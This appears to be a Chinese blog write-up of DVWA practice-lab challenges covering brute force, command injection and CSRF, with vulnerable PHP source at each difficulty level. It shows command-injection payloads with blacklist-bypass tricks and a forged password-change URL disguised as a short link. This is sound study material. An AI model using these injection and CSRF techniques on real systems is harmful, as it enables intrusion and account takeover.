class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line"><span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the database (Check user information)</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line"><span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line"><span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line"><span class="variable">$last_login</span> = <span class="title function_ invoke__">strtotime</span>( <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line"><span class="variable">$timeout</span>    = <span class="variable">$last_login</span> + (<span class="variable">$lockout_time</span> * <span class="number">60</span>);</span><br><span class="line"><span class="variable">$timenow</span>    = <span class="title function_ invoke__">time</span>();</span><br><span class="line">        </span><br><span class="line"><span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$timenow</span> &lt; <span class="variable">$timeout</span> ) &#123;</span><br><span class="line"><span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// If its a valid login...</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$account_locked</span> == <span class="literal">false</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Get users details</span></span><br><span class="line"><span class="variable">$avatar</span>       = <span class="variable">$row</span>[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line"><span class="variable">$failed_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line"><span class="variable">$last_login</span>   = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Login successful</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) &#123;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;<span class="subst">&#123;$last_login&#125;</span>&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reset bad login count</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Login failed</span></span><br><span class="line"><span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Give the user some feedback</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update bad login count</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the last login time</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Add"><a href="#Add" class="headerlink" title="Add"></a>Add</h2><p> 做到这里我想起来了<code>Pikachu靶场</code>的爆破题目，加入了图形验证码机制，然后我就去把这种题目通了，很简单Burp加个验证码识别的插件就可以，就是环境配起来有点小麻烦！</p><h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><blockquote><p>我认为本质就是考命令执行连接符以及黑名单绕过</p></blockquote><ul><li><a class="link" href="https://blog.csdn.net/liweibin812/article/details/86235692">出现乱码解决方案<i class="fas fa-external-link-alt"></i></a></li></ul><blockquote><ul><li>From OWASP<br>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</li><li>This attack differs from Code Injection, in that code injection allows the attacker to add their own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.</li></ul></blockquote><ul><li>跟<code>pikachu靶场</code>中的<code>RCE</code>类型可以结合在一起学习。</li></ul><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><p>​    因为有过基础，所以自然就会下列的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip &amp; command</span><br><span class="line">ip | command</span><br></pre></td></tr></table></figure><p>​    Low难度也是给面子，直接就通了。</p><p>​    查看源码探究一下原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) </span><br><span class="line">&#123;</span><br><span class="line">// Get input</span><br><span class="line">$target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">// Determine OS and execute the ping command.</span><br><span class="line">if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">// Windows</span><br><span class="line">$cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// *nix</span><br><span class="line">$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Feedback for the end user</span><br><span class="line">$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!--前端： --&gt;   </span><br><span class="line">&lt;form name=&quot;ping&quot; action=&quot;#&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        Enter an IP address:</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;ip&quot; size=&quot;30&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>​    程序执行流程没啥好解释的，直接把我们提交的数据和<code>ping</code>命令连接起来放在执行函数中直接执行了。</p><p>补充知识：</p><ul><li><p>stristr() 函数搜索字符串在另一字符串中的第一次出现。</p><p><strong>注释：</strong>该函数是不区分大小写的。如需进行区分大小写的搜索，请使用 <a class="link" href="https://www.runoob.com/php/func-string-strstr.html">strstr()<i class="fas fa-external-link-alt"></i></a> 函数。</p></li><li><p><code>php_uname()</code>是PHP的一个内置函数，用于获取服务器的操作系统信息。它返回一个包含操作系统名称的字符串。</p><p>该函数可以接受一个可选的参数来指定返回的信息类型，常用的参数如下：</p><ul><li><code>&#39;s&#39;</code>：返回操作系统的名称（比如 Windows NT、Linux、Darwin等）。</li><li><code>&#39;n&#39;</code>：返回网络主机名。</li><li><code>&#39;r&#39;</code>：返回操作系统的版本号。</li><li><code>&#39;v&#39;</code>：返回操作系统的版本信息。</li></ul></li><li><blockquote><p><code>shell_exec()</code>是PHP的一个内置函数，用于执行系统命令，并将命令的输出作为字符串返回。它允许在PHP脚本中执行外部命令或程序。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>(<span class="keyword">string</span> <span class="variable">$command</span>)</span><br></pre></td></tr></table></figure><p>参数<code>$command</code>是要执行的系统命令，可以是任何有效的命令行命令或可执行文件。</p><p><code>shell_exec()</code>函数执行指定的命令，并将命令的输出作为字符串返回给调用者。如果命令没有产生任何输出，或者命令执行失败，函数将返回<code>NULL</code>。</p></blockquote></li><li><p><code>ping -c 4</code>中<code>-c 4</code>是ping命令的一个选项，用于指定要发送的回显请求的数量。在这个特定的例子中，<code>-c 4</code>表示要发送4个回显请求。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在PHP中，点号（.）被用作字符串连接运算符，用于将两个字符串连接在一起。</span></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;world!&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$str1</span> . <span class="variable">$str2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>; <span class="comment">// 输出：Hello world!</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="D:\Typora\typora-user-images\image-20230708001143708.png"></p><blockquote><p>Summarid by sqlsec.com</p></blockquote><table><thead><tr><th>Linux中符号</th><th>说明</th></tr></thead><tbody><tr><td>A;B</td><td>A 不论正确与否都会执行 B 命令</td></tr><tr><td>A&amp;B</td><td>A 后台运行，A 和 B 同时执行</td></tr><tr><td>A&amp;&amp;B</td><td>A 执行成功时候才会执行 B 命令</td></tr><tr><td>A|B</td><td>A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令</td></tr><tr><td>A||B</td><td>A 执行失败后才会执行 B 命令</td></tr></tbody></table><blockquote><p>在命令执行中A&amp;B与A;B有什么区别？</p><p>​    在命令执行中，<code>A&amp;B</code>和<code>A;B</code>表示不同的命令执行方式：</p><ol><li><code>A&amp;B</code>：表示将命令A放在后台执行，并立即启动命令B。具体来说，命令A将在后台执行，不会阻塞当前命令行或脚本的执行，而命令B将在前台执行。这种方式常用于需要同时执行多个命令，并希望它们在后台并行执行的情况。</li><li><code>A;B</code>：表示按顺序执行命令A和命令B。具体来说，命令A将在执行完毕后，才会开始执行命令B。这种方式常用于需要按顺序执行多个命令，并确保前一个命令执行完毕后再执行下一个命令的情况。</li></ol></blockquote><ul><li>由于我的靶场搭建在windows环境下,Linux命令需要等效代替：<ul><li><code>ls</code>，对应于windows的<code>dir</code></li><li><code>pwd</code>，对应于windows的<code>chdir</code></li><li><code>cat</code>，对应于windows的<code>type</code></li></ul></li></ul><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">----------打得通----------</span><br><span class="line">|</span><br><span class="line">&amp;</span><br><span class="line">----------打不通----------</span><br><span class="line">&amp;&amp;</span><br></pre></td></tr></table></figure><p>看看源码，多了这部分:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>相比Low难度，这里使用了黑名单将里面的内容过滤掉了。</p><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">----------打得通----------</span><br><span class="line">|</span><br><span class="line">----------打不通----------</span><br><span class="line">&amp;&amp;</span><br><span class="line">&amp;</span><br><span class="line">----------而且是必须紧挨后面的命令没有空格才可以打通----------</span><br><span class="line">127.0.0.1|ls</span><br></pre></td></tr></table></figure><p>查看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>好家伙，给禁用的差不多了，但是注意<code>&#39;| &#39; =&gt; &#39;&#39;</code>中的管道符后面有个空格。</p><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><p>看看源码学习学习：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"><span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Split the IP into 4 octects</span></span><br><span class="line"><span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check IF each octet is an integer</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line"><span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Windows</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// *nix</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知识点补充：</p><blockquote><p><code>explode()</code>函数是PHP的一个内置函数，用于将一个字符串根据指定的分隔符拆分成一个数组。它的语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> <span class="title function_ invoke__">explode</span>(<span class="keyword">string</span> <span class="variable">$delimiter</span>, <span class="keyword">string</span> <span class="variable">$string</span>[, <span class="keyword">int</span> <span class="variable">$limit</span>])</span><br></pre></td></tr></table></figure><p>参数解释：</p><ul><li><code>$delimiter</code>：指定的分隔符，用于将字符串拆分成数组元素。</li><li><code>$string</code>：要拆分的原始字符串。</li><li><code>$limit</code>（可选）：限制拆分后的数组元素数量。</li></ul><p>在这段代码中，分隔符是<code>.</code>，原始字符串是<code>$target</code>。<code>explode()</code>函数会将<code>$target</code>字符串中的每个<code>.</code>作为分隔符，将字符串拆分成多个部分，并将这些部分存储在一个数组中。</p><p>拆分后的结果将存储在名为<code>$octet</code>的数组中。每个<code>$octet</code>数组元素都对应一个原始字符串中<code>.</code>分隔的部分。假设<code>$target</code>的值是<code>&quot;192.168.0.1&quot;</code>，那么<code>$octet</code>数组的内容将是<code>[&quot;192&quot;, &quot;168&quot;, &quot;0&quot;, &quot;1&quot;]</code>，即将IP地址的每个段拆分成一个数组元素。</p></blockquote><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">is_numeric</span>(<span class="keyword">mixed</span> <span class="variable">$var</span>)</span><br></pre></td></tr></table></figure><p>参数$var是要检查的变量。</p><p>当$var是一个数值或数值字符串时，is_numeric()函数将返回true，否则返回false。</p></blockquote><p>​    问题出在最后被分割的一个数组元素，它还包含着我们输入的连接符和命令所以不是数值，从而不满足条件，有点意思。</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><blockquote><p><strong>Cross Site Request Forgery:跨站请求伪造</strong></p></blockquote><blockquote><p>贴上Pikachu靶场的概述:</p><ul><li>在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</li><li>我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。</li><li>CSRF与XSS的区别：<strong>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</strong></li><li>网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<ul><li>对敏感信息的操作增加安全的token；</li><li>对敏感信息的操作增加安全的验证码；</li><li>对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</li></ul></li></ul></blockquote><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><blockquote><p>无任何防护措施</p></blockquote><p>当我们修改密码时候提交后URL变成了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#</span><br></pre></td></tr></table></figure><p>此时当我们登录另外一个账号</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.5xn8j1yh40s0.png"></p><p>这里我选择user为1337的账号：<br>但是让该用户直接点击上面url难度比较大，我们尝试伪造成短链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1i8.cn/kkyiM</span><br></pre></td></tr></table></figure><p>当用户点击此链接后密码就会被更改为<code>admin</code></p><p>我们登录验证一下：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.317hjnl5ymg0.png"></p><p>修改成功</p><h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><p>当我同样按上面做的时候出现了报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That request didn&#x27;t look correct.</span><br></pre></td></tr></table></figure><p>应该是加入了某种校验机制?查看源码发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br></pre></td></tr></table></figure><p>​    即是增加了<code>referer</code>验证机制</p><blockquote><p><code>stripos()</code>是PHP的一个内置函数，用于在字符串中查找子字符串的第一次出现的位置（不区分大小写）。它返回子字符串在原始字符串中的位置索引，如果未找到则返回<code>false</code>。</p></blockquote><blockquote><p><code>stripos()</code>函数的语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>|<span 